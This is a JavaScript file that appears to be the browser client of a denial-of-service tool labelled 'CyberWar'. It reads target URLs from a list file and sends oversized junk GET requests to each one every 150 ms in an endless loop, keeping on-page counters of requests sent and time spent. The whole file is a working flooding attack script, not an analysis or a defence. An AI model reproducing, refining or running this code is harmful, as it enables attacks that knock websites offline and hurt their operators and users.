var Cyber_num_ofReq = 0;

function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = fetch(url + "?" + data.data, {
        method: 'GET', // *GET, POST, PUT, DELETE, etc.
        mode: 'no-cors', // no-cors, *cors, same-origin
        cache: 'reload', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
                // 'Content-Type': 'application/x-www-form-urlencoded',
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
        //body: data.data // body data type must match "Content-Type" header
    });

    Cyber_num_ofReq++;

    $("#Cyber_num_ofReq").text(Cyber_num_ofReq);
    return response; // parses JSON response into native JavaScript objects
}

function issue(state) {
    const overall_Stages = 2;
    var onStart_Stage = 1;
    if (state == "CyberWar") {
        $.get('cyber_list.txt', function(data) {
            gatheredCyberList = data.split(/\r?\n/);
            console.info("This service is running`: Preparation [" + onStart_Stage + "/" + overall_Stages + "].")
            var gatheredCyberList_length = gatheredCyberList.length;

            var send_formBody = [];

            var junk = "";
            for (var i = 0; i < 249; i++) {
                junk += "google_analyticsAPI_id:anerror"
            }

            var details = {
                'ga_id': junk + Date.now(),
                'ga_state': "error",
            };
            for (var property in details) {
                var encodedKey = encodeURIComponent(property);
                var encodedValue = encodeURIComponent(details[property]);
                send_formBody.push(encodedKey + "=" + encodedValue);
            }
            send_formBody = send_formBody.join("&");

            function runner_CyberFun() {
                const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

                (function loop(i) {
                    if (i >= gatheredCyberList_length) {
                        console.log("New round.");
                        i = 0;
                        runner_CyberFun();
                        return;
                    }
                    delay(150).then(() => {
                        console.log(gatheredCyberList[i]);
                        postData(gatheredCyberList[i], { data: send_formBody })
                            .then(data => {
                                console.log(data); // JSON data parsed by `data.json()` call
                            });
                        loop(i + 1);
                    });
                })(0);
            }

            runner_CyberFun();
        });
    }
}






var time_Spent = 0;
var temp__converted = 0;
var intervalId_for_time_Spent = window.setInterval(function() {
        time_Spent += 0.01;
        temp__converted = Math.trunc(parseFloat(time_Spent).toFixed(2))
        $("#Cyber_time_Spent_min").text(Math.trunc(temp__converted)).show('slow');
        $("#Cyber_time_Spent_sec").text(parseFloat(time_Spent - temp__converted).toFixed(1) * 10).show('slow');
    },
    100);